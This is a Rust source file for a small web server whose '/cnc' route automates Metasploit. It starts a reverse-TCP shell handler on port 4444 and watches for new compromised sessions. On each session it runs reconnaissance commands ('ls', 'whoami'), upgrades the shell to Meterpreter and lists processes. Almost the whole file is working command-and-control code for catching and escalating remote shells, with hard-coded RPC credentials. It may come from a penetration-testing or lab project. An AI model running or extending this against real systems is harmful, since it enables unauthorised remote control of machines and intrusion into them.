#![feature(proc_macro_hygiene, decl_macro)]

use std::collections::HashSet;
use std::collections::HashMap;

use std::{thread,time};
use std::sync::mpsc;

use msf_client::msg::SessionListRet;

use msf_client::client::MsfClient;
use msf_client::modules::MsfModule;

pub mod models;

use models::Session;

#[macro_use] extern crate rocket;
#[macro_use] extern crate diesel;
#[macro_use] extern crate rocket_contrib;

use diesel::SqliteConnection;

#[database("sqlite_database")]
pub struct DbConn(SqliteConnection);

#[get("/cnc")]
fn cnc(sql_conn: DbConn) -> &'static str {
    let mut client = MsfClient::new("msf", "1234", "http://127.0.0.1:55553/api/".to_string())
                               .expect("Trying to connect");

    let th1_conn_clone = client.clone_conn();
    let th2_conn_clone = client.clone_conn();

    // thread setup
    let (tx, rx) = mpsc::channel();

    thread::spawn(move || {
        let mut client_clone = MsfClient::new_from(th1_conn_clone);

        let mut sids: HashSet<u32> = HashSet::new();
        let mut sess_info;
        let ten_millis = time::Duration::from_millis(10);

        // infinitely listen for new sessions
        loop {

            sess_info = client_clone.sessions().list().expect("List of current sessions");

            let new_sid_info: HashSet<u32> = sess_info.keys().cloned().collect();
            let new_sids: HashSet<u32> = new_sid_info.difference(&sids).cloned().collect();

            if new_sids.len() > 0 {
                sids = sids.union(&new_sids).cloned().collect();

                let mut new_sess_info: SessionListRet = HashMap::new();
                for new_sid in &new_sids {
                    new_sess_info.insert(new_sid.clone(), (*sess_info.get(new_sid).unwrap()).clone());
                }

                tx.send(new_sess_info).unwrap();
            }

            thread::sleep(ten_millis);
        }
    });

    thread::spawn(move || {
        let mut client_clone = MsfClient::new_from(th2_conn_clone);

        // need to wait on child thread to send us session info on channel
        let sess_info: SessionListRet = rx.recv().unwrap();

        let mut sessions = client_clone.sessions();

        let ten_milli = time::Duration::from_millis(100);

        for sid in sess_info.keys() {
            let mut session = sessions.session(*sid).expect("Getting session");

            loop {
                println!("{}", session.write(String::from("ls\n")));

                thread::sleep(ten_milli);

                let sess_out = session.read();
                println!("{}", sess_out);

                if sess_out.contains("PENKIT_LICENSE") {
                    break;
                }
            }
      
            println!("{}", session.write(String::from("whoami\n")));

            thread::sleep(ten_milli);

            println!("{}", session.read());

            let mut post_mod = client_clone.modules()
                             .use_post("multi/manage/shell_to_meterpreter");

            post_mod.run_options.insert(String::from("SESSION"), String::from((*sid).to_string()));

            let job_id_post = post_mod.exploit().expect("Running post");
            println!("{:?}", job_id_post);
        }

        // wait for new meterpreter session
        let met_sess_info: SessionListRet = rx.recv().unwrap();
        
        for sid in met_sess_info.keys() {
            let mut session = sessions.session(*sid).expect("Getting session");
     
            println!("{}", sid);

            loop {
                println!("{}", session.write(String::from("ps")));

                thread::sleep(ten_milli);

                let sess_out = session.read();
                println!("{}", sess_out);

                if !sess_out.contains("Unknown command") {
                    break;
                }
            }

        }

    });

    println!("{:?}", Session::all(&sql_conn));

    let mut exp_mod = client.modules()
                            .use_exploit("exploit/multi/handler");

    exp_mod.run_options.insert(String::from("LHOST"), String::from("0.0.0.0"));
    exp_mod.run_options.insert(String::from("LPORT"), String::from("4444"));
    exp_mod.run_options.insert(String::from("PAYLOAD"), String::from("linux/x86/shell/reverse_tcp"));

    let job_id_exp = exp_mod.exploit().expect("Running exploit");
    println!("{:?}", job_id_exp);

    "Hello World"
 }
 
 fn main() {
     rocket::ignite()
         .attach(DbConn::fairing())
         .mount("/", routes![cnc]).launch();
 }
